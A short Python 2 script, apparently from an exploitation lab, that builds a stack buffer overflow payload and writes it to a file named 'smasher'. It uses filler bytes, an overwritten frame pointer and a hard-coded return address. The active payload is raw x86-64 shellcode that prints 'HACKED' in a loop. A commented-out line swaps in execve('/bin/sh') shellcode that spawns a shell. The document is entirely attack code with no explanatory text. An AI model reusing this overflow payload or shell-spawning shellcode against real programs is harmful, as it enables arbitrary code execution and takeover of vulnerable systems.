#!/usr/bin/env python2

buf = ('A' * 32).encode() #41

ebp = ('B' * 8).encode()  #42

call_virus = b'\xc0\xdf\xff\xff\xff\x7f\x00\x00'

virus =  b'\x55\x48\x89\xe5\x48\x83\xec\x20'
virus += b'\x89\x7d\xec\x48\x89\x75\xe0\xc6'
virus += b'\x45\xf8\x48\xc6\x45\xf9\x41\xc6'
virus += b'\x45\xfa\x43\xc6\x45\xfb\x4b\xc6'
virus += b'\x45\xfc\x45\xc6\x45\xfd\x44\xc6'
virus += b'\x45\xfe\x0a\xc6\x45\xff\x00\x48'
virus += b'\x8d\x45\xf8\x48\xba\x20\xea\xe4'
virus += b'\xf7\xff\x7f\x00\x00\x48\x89\xc7'
virus += b'\xb8\x00\x00\x00\x00\xff\xd2\xeb'
virus += b'\xe6\x0f\x1f\x44\x00\x00\x00\x00'

shell =  b'\x6a\x3b\x58\x99\x52\x48\xbb\x2f'
shell += b'\x2f\x62\x69\x6e\x2f\x73\x68\x53'
shell += b'\x54\x5f\x52\x57\x54\x5e\x0f\x05'

exploit = (buf + ebp + call_virus + virus)
#exploit = (buf + ebp + call_virus + shell)

file_name = 'smasher'
f = open(file_name, 'wb') #write bytes
f.write(exploit)
f.close()

print("Write file: " + file_name)
